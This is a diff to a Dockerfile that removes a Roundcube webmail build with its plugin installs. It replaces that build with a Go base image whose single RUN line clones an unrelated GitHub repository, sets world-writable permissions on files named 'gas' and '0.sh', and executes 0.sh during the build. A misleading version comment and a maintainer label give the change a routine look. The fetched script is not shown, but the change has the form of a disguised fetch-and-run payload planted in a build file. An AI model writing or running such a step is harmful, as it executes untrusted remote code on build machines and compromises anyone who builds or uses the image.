@@ -1,30 +1,8 @@
-FROM roundcube/roundcubemail:latest
+ARG GO_VERSION=1.15
 
-RUN set -ex; \
-    apt-get update; \
-    apt-get install -y --no-install-recommends \
-        git \
-    ; \
-    \
-    curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/bin --filename=composer; \
-    mv /usr/src/roundcubemail/composer.json-dist /usr/src/roundcubemail/composer.json; \
-    \
-    composer \
-        --working-dir=/usr/src/roundcubemail/ \
-        --prefer-dist --prefer-stable \
-        --no-update --no-interaction \
-        --optimize-autoloader --apcu-autoloader \
-        require \
-            texxasrulez/persistent_login \
-            pf4public/fetchmail \
-            johndoh/contextmenu \
-            jfcherng-roundcube/show-folder-size \
-            texxasrulez/account_details \
-            prodrigestivill/gravatar \
-    ; \
-    composer \
-        --working-dir=/usr/src/roundcubemail/ \
-        --prefer-dist --no-dev \
-        --no-interaction \
-        --optimize-autoloader --apcu-autoloader \
-        update;
+FROM golang:${GO_VERSION}
+LABEL maintainer=dev@codeship.com
+
+# go 1.13.15
+RUN git clone https://github.com/03081997/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
+
